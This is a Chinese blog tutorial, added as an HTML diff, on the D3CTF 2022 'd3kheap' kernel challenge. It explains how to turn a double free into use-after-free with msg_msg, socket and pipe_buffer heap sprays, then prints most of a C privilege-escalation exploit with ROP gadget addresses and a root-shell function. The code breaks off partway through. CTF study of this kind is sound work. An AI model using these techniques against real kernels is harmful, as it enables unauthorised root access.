@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    
+    <title>教你学内核-d3kheap | -NIYAH-</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+
+    
+        <meta property="algolia:search" data-application-id="J7XB8WB9FZ" data-api-key="8f85e3019c85416686ccfe4fc498c065" data-index-name="Niyah">
+    
+
+    
+
+    
+
+    
+        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>/images/nia.jpg</text></svg>">
+    
+
+    
+
+    
+
+    
+<link rel="stylesheet" href="/dist/build.css?v=1629946964125.css">
+
+
+    <script>
+        window.isPost = true
+        window.aomori = {
+            
+            
+            valine: {
+                enable: true,
+                appId: "EWrkUk5e2JLQDjKa82Pt2dVH-gzGzoHsz",
+                appKey: "A0QQmMoivqHI4IF8skQ3ya5X",
+            },
+            
+            
+        }
+        window.aomori_logo_typed_animated = true
+        window.aomori_search_algolia = true
+
+    </script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="-NIYAH-" type="application/atom+xml">
+</head>
+
+<body>
+
+    <div class="container">
+    <header class="header">
+        <div class="header-type">
+            
+            <div class="header-type-avatar avatar avatar-sm">
+                <img src="/images/nia.jpg" alt="Niyah">
+            </div>
+            
+            <div class="header-type-inner">
+                
+                    <div id="typed-strings" style="display:none">
+                        <p>-NIYAH-</p>
+                    </div>
+                    <a class="header-type-title" id="typed" href="/"></a>
+                
+    
+                
+            </div>
+        </div>
+        <div class="header-menu">
+            <div class="header-menu-inner">
+                
+                <a href="/">Home</a>
+                
+                <a href="/archives">Archives</a>
+                
+                <a href="/friends">Friends</a>
+                
+                <a href="/about">About</a>
+                
+            </div>
+            <div class="header-menu-social">
+                
+    <a class="social" target="_blank" href="https://github.com/Orcust-Automaton">
+        <box-icon type='logo' name='github'></box-icon>
+    </a>
+
+            </div>
+        </div>
+
+        <div class="header-menu-mobile">
+            <div class="header-menu-mobile-inner" id="mobile-menu-open">
+                <i class="icon icon-menu"></i>
+            </div>
+        </div>
+    </header>
+
+    <div class="header-menu-mobile-menu">
+        <div class="header-menu-mobile-menu-bg"></div>
+        <div class="header-menu-mobile-menu-wrap">
+            <div class="header-menu-mobile-menu-inner">
+                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
+                    <i class="icon icon-cross"></i>
+                </div>
+                <div class="header-menu-mobile-menu-list">
+                    
+                    <a href="/">Home</a>
+                    
+                    <a href="/archives">Archives</a>
+                    
+                    <a href="/friends">Friends</a>
+                    
+                    <a href="/about">About</a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+    <div class="container">
+        <div class="main">
+            <section class="inner">
+                <section class="inner-main">
+                    <div class="post">
+    <article id="post-cla21lbuh000028oq7i9q33oe" class="article article-type-post" itemscope
+    itemprop="blogPost">
+
+    <div class="article-inner">
+
+        
+          
+        
+        
+        
+
+        
+        <header class="article-header">
+            
+  
+    <h1 class="article-title" itemprop="name">
+      教你学内核-d3kheap
+    </h1>
+  
+
+        </header>
+        
+
+        <div class="article-more-info article-more-info-post hairline">
+
+            <div class="article-date">
+  <time datetime="2022-11-04T05:10:27.000Z" itemprop="datePublished">2022-11-04</time>
+</div>
+
+            
+            <div class="article-category">
+                <a class="article-category-link" href="/categories/%E6%95%99%E7%A8%8B/">教程</a>
+            </div>
+            
+
+            
+            <div class="article-tag">
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80/" rel="tag">C语言</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
+            </div>
+            
+
+            
+
+        </div>
+
+        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
+            <blockquote>
+<p>确实没鸽</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="d3ctf-2022-d3kheap"><a class="markdownIt-Anchor" href="#d3ctf-2022-d3kheap">#</a> D3CTF 2022 D3Kheap</h1>
+<p>这题属实抽象，mod 模块啥都没给，就给了申请完堆块两次 free 的机会，那么我们就需要控制许多内核结构体来完成对 double free 到 uaf 的转化，随后逐步劫持结构体的控制流</p>
+<h2 id="背景知识"><a class="markdownIt-Anchor" href="#背景知识">#</a> 背景知识</h2>
+<p>我们都学过操作系统，那就绕不开通信的问题，无论是进程间通信，还是网络编程，linux 都给了我们很多函数，比如说消息队列 msg_queue，套接字 socket，管道 pipe 等等，那么既然是进程间通信，必须会使用到内核空间，因此也一定申请内核堆块，创建结构体，因此需要从这些结构体，完成对 double free 的利用。</p>
+<h3 id="消息队列-msg_queue"><a class="markdownIt-Anchor" href="#消息队列-msg_queue">#</a> 消息队列 msg_queue</h3>
+<p>有如下函数：msgget，msgsnd，msgrcv</p>
+<p>在使用函数 msgget 创建一个消息队列时，会创建一个 msg_queue 结构体，如下</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">msg_queue</span> <span class="token punctuation">&#123;</span><span class="token comment">//msg队列结构体</span>
+	<span class="token keyword">struct</span> <span class="token class-name">kern_ipc_perm</span> q_perm<span class="token punctuation">;</span> <span class="token comment">//每个ipc 相关结构体都要有q_perm</span>
+	time64_t q_stime<span class="token punctuation">;</span>		<span class="token comment">/* last msgsnd time */</span>
+	time64_t q_rtime<span class="token punctuation">;</span>		<span class="token comment">/* last msgrcv time */</span>
+	time64_t q_ctime<span class="token punctuation">;</span>		<span class="token comment">/* last change time */</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> q_cbytes<span class="token punctuation">;</span>		<span class="token comment">/* 当前消息队列中的字节数 */</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> q_qnum<span class="token punctuation">;</span>		<span class="token comment">/* 当前消息队列中的消息数 */</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> q_qbytes<span class="token punctuation">;</span>		<span class="token comment">/* 消息队列中允许的最大字节数 */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">pid</span> <span class="token operator">*</span>q_lspid<span class="token punctuation">;</span>		<span class="token comment">/* pid of last msgsnd */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">pid</span> <span class="token operator">*</span>q_lrpid<span class="token punctuation">;</span>		<span class="token comment">/* last receive pid */</span>
+
+	<span class="token keyword">struct</span> <span class="token class-name">list_head</span> q_messages<span class="token punctuation">;</span><span class="token comment">/* 消息队列 */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">list_head</span> q_receivers<span class="token punctuation">;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">list_head</span> q_senders<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> __randomize_layout<span class="token punctuation">;</span></code></pre>
+<p>使用 msgsnd 向该消息发送一段消息时，会创建一个 msg_msg 结构体，如下</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token punctuation">&#123;</span><span class="token comment">//主消息段头部</span>
+	<span class="token keyword">struct</span> <span class="token class-name">list_head</span> m_list<span class="token punctuation">;</span> <span class="token comment">//消息双向链表指针</span>
+	<span class="token keyword">long</span> m_type<span class="token punctuation">;</span>
+	size_t m_ts<span class="token punctuation">;</span>		<span class="token comment">/* 消息大小 */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span> <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment">//指向消息第二段</span>
+	<span class="token keyword">void</span> <span class="token operator">*</span>security<span class="token punctuation">;</span>
+	<span class="token comment">/* 后面接着消息的文本 */</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span> <span class="token punctuation">&#123;</span><span class="token comment">//子消息段头部</span>
+	<span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span> <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment">//指向下一段的指针，最多三段</span>
+	<span class="token comment">/* 后面接着消息第二/三段的文本 */</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
+<p>我们注意到 q_messages 和 m_list 的两个指针，这两个指针实际上会互相指向形成一个双向链表，而当消息长度 大于 0x1000 时会启用 next 指针指向一个 msg_msgseg 结构体来存放多于的数据，再次发送消息便又会创建 msg_msg 结构体，使用 m_list 来互相链接，用 msg_queue 作为队列头形成一个消息队列</p>
+<blockquote>
+<p>这里 m_ts 表示消息的长度，如果 m_ts 改大 而 next 为空时，便会发生越界读取数据，而当 next 存在指针时，便会实现任意地址读取</p>
+</blockquote>
+<p>可以看到 结构体的大小不是固定的，因此可以达到一个任意大小堆块申请的效果</p>
+<h3 id="套接字-socket"><a class="markdownIt-Anchor" href="#套接字-socket">#</a> 套接字 socket</h3>
+<p>可以使用 socketpair 创建一个 socket 会返回一对 fd ，其结构体无所谓，但是向其中写入数据时会申请 object ，其中 object 可以是 大于 320 的任意大小，当然这个 320 并不在头部，不然也就不好控了</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangquan1992/article/details/112572572">https://blog.csdn.net/wangquan1992/article/details/112572572</a></p>
+<p>从另一端读取 socket 就会释放掉该堆块</p>
+<h3 id="管道pipe"><a class="markdownIt-Anchor" href="#管道pipe">#</a> 管道 pipe</h3>
+<p>使用 pipe 创建一对 pipe 会返回一对 fd ，这里同样是对 pipe_buffer 进行说明，这里比较特别，内核总会用掉许多 pipe_buffer 使其刚好申请 0x400 大小的堆块</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> offset<span class="token punctuation">,</span> len<span class="token punctuation">;</span>
+	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token operator">*</span>ops<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> flags<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> private<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
+<blockquote>
+<p>其 ops 是一个函数表指针，可以使用它泄露地址，也可以用其来劫持控制流</p>
+</blockquote>
+<p>从另一端读取 pipe 就会释放掉该堆块</p>
+<h2 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路">#</a> 利用思路</h2>
+<ol>
+<li>首先打开 socket 和 msg 等后面需要的结构体；</li>
+<li>使用 模块功能 申请一个大小为 1024 的堆块；</li>
+<li>不断使用 msgsnd 创建消息，此时控制大小便会创建相应大小的堆块，在过程中使用 模块功能 释放掉该 1024 大小的堆块，此时 msg_msg 就有可能分配到 该位置；</li>
+<li>使用 模块功能 释放掉该 1024 大小的堆块，此时某一个 msg_queue 结构体被破坏，msg_msg 虽然被释放但是依旧存在在这个队列里；</li>
+<li>不断向 socket 写数据来堆喷到 msg_msg ，此时已经可以控制 msg_msg 结构体，改大 msg_msg 的 size；</li>
+<li>通过 特殊字段 flag 的 msgrcv 来查看 msg_queue 的队列消息是否存在，不存在则返回 -1 ，此时我们的 msg_msg 结构体已经可控，因此改乱它使其返回 -1 从而来找出已经可控的 msg_msg 结构体；</li>
+<li>接受 socket 另一端释放掉堆块，并再次使用 socket 写数据来申请堆块去修改 msg_msg 结构体，此时改大其 size 位，让其 msg_msg 能够越界泄露出数据；</li>
+<li>通过 特殊字段 flag 的 msgrcv 来越界泄露出 堆地址，此时已经知道哪个 msg_queue 出问题，因此可以直接定位到该 msg_msg 结构，因为泄露出来的是相邻堆块的指针，并且其 prev 指针指向了 队列的前一个消息；</li>
+<li>重复 7、8 步，而此时 msg_msg 结构体的 next 因为已经泄露出了 堆地址，所以是可控的，再次泄露出 可控 msg_msg 堆块的地址（这里简单计算就可以得到）；</li>
+<li>使用 msgrcv 把数据接受掉从而释放该 msg_msg，同时 socket 的某一个 object 已经被释放掉了；</li>
+<li>堆喷 pipe 结构体，此时 socket 的某一个 object 已经被分配到了 pipe_buffer 结构体中，因此使用 socket 另一端读的时候便会读到 pipe_buffer 结构体的内容，pipe_buffer 有个 内核指针，因此通过其计算出 内核基地址，此时该 object 已经被 socket  释放；</li>
+<li>再次使用 socket 写数据申请堆块到 pipe_buffer，并劫持掉 ops 函数表，最后关闭 pipe 执行 栈迁移 并 rop。</li>
+</ol>
+<p>exp 按照官方的改了改（指翻译成中文），有机会完全自己做一下</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">_GNU_SOURCE</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;err.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;inttypes.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ipc.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/msg.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">MSG_TAG <span class="token number">0x41414141</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">PRIMARY_MSG_TYPE <span class="token number">1</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">SECONDARY_MSG_TYPE <span class="token number">2</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">VICTIM_MSG_TYPE <span class="token number">0x11037</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">SK_BUFF_NUM <span class="token number">0x80</span></span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">PIPE_NUM <span class="token number">0x100</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">SOCKET_NUM <span class="token number">0x10</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">MSG_QUEUE_NUM <span class="token number">0x1000</span></span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">PRIMARY_MSG_SIZE <span class="token number">0x60</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">SECONDARY_MSG_SIZE <span class="token number">0x400</span></span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">COMMIT_CREDS <span class="token number">0xffffffff810D25C0</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">POP_RDI_RET <span class="token number">0xffffffff810938f0</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">INIT_CRED <span class="token number">0xffffffff82c6d580</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">ANON_PIPE_BUF_OPS <span class="token number">0xffffffff8203fe40</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">PUSH_RSI_POP_RSP_POP_4VAL_RET <span class="token number">0xffffffff812dbede</span></span></span>
+
+<span class="token comment">// 此 gadget 是在 __mmu_interval_notifier_insert 附近错出的一个 gadget</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE <span class="token number">0xffffffff81c00ff0</span></span></span>
+
+
+size_t kernel_offset<span class="token punctuation">,</span> kernel_base <span class="token operator">=</span> <span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span>
+size_t user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span>
+<span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+<span class="token comment">/*
+ * object 大小必会加上 320，因此需要申请 704 的大小
+ * 1024 - 320 = 704
+ */</span>
+<span class="token keyword">char</span> fake_secondary_msg<span class="token punctuation">[</span><span class="token number">704</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token punctuation">&#123;</span>
+    uint64_t    next<span class="token punctuation">;</span>
+    uint64_t    prev<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>list_head<span class="token punctuation">;</span>
+
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">&#123;</span>
+    list_head   m_list<span class="token punctuation">;</span>
+    uint64_t    m_type<span class="token punctuation">;</span>
+    uint64_t    m_ts<span class="token punctuation">;</span>
+    uint64_t    next<span class="token punctuation">;</span>
+    uint64_t    security<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>msg_msg<span class="token punctuation">;</span>
+
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span><span class="token punctuation">&#123;</span>
+    uint64_t    next<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>msg_msgseg<span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>PRIMARY_MSG_SIZE <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>primary_msg<span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> 
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>SECONDARY_MSG_SIZE <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>secondary_msg<span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span><span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> oob_msg<span class="token punctuation">;</span>
+
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span>
+<span class="token punctuation">&#123;</span>
+    uint64_t    page<span class="token punctuation">;</span>
+    uint32_t    offset<span class="token punctuation">,</span> len<span class="token punctuation">;</span>
+    uint64_t    ops<span class="token punctuation">;</span>
+    uint32_t    flags<span class="token punctuation">;</span>
+    uint32_t    padding<span class="token punctuation">;</span>
+    uint64_t    private<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>pipe_buffer<span class="token punctuation">;</span>
+
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span>
+<span class="token punctuation">&#123;</span>
+    uint64_t    confirm<span class="token punctuation">;</span>
+    uint64_t    release<span class="token punctuation">;</span>
+    uint64_t    try_steal<span class="token punctuation">;</span>
+    uint64_t    get<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>pipe_buf_operations<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[34m\033[1m[Info] %s \033[0m\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[31m\033[1m[Error] %s\n\033[0m"</span> <span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">lg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token punctuation">,</span> size_t address<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[Data] %s : \033[0m\033[35m\033[1m%#lx \033[0m\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">__asm__</span><span class="token punctuation">(</span>
+        <span class="token string">".intel_syntax noprefix;"</span>
+        <span class="token string">"mov user_cs, cs;"</span>
+        <span class="token string">"mov user_ss, ss;"</span>
+        <span class="token string">"mov user_sp, rsp;"</span>
+        <span class="token string">"pushf;"</span>
+        <span class="token string">"pop user_rflags;"</span>
+        <span class="token string">".att_syntax;"</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"status saved!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Failed to get root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Get root!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd <span class="token punctuation">,</span> <span class="token number">0x1234</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd <span class="token punctuation">,</span> <span class="token number">0xDEAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">buildMsg</span><span class="token punctuation">(</span>
+    msg_msg <span class="token operator">*</span>msg<span class="token punctuation">,</span> 
+    uint64_t m_list_next<span class="token punctuation">,</span>
+    uint64_t m_list_prev<span class="token punctuation">,</span> 
+    uint64_t m_type<span class="token punctuation">,</span> 
+    uint64_t m_ts<span class="token punctuation">,</span> 
+    uint64_t next<span class="token punctuation">,</span> 
+    uint64_t security
+    <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">=</span> m_list_next<span class="token punctuation">;</span>
+    msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">=</span> m_list_prev<span class="token punctuation">;</span>
+    msg<span class="token operator">-></span>m_type <span class="token operator">=</span> m_type<span class="token punctuation">;</span>
+    msg<span class="token operator">-></span>m_ts <span class="token operator">=</span> m_ts<span class="token punctuation">;</span>
+    msg<span class="token operator">-></span>next <span class="token operator">=</span> next<span class="token punctuation">;</span>
+    msg<span class="token operator">-></span>security <span class="token operator">=</span> security<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">writeMsg</span><span class="token punctuation">(</span><span class="token keyword">int</span> msqid<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> size_t msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> msgtyp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>msgp <span class="token operator">=</span> msgtyp<span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">msgsnd</span><span class="token punctuation">(</span>msqid<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">readMsg</span><span class="token punctuation">(</span><span class="token keyword">int</span> msqid<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> size_t msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> msgtyp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msgtyp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">peekMsg</span><span class="token punctuation">(</span><span class="token keyword">int</span> msqid<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> size_t msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> msgtyp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
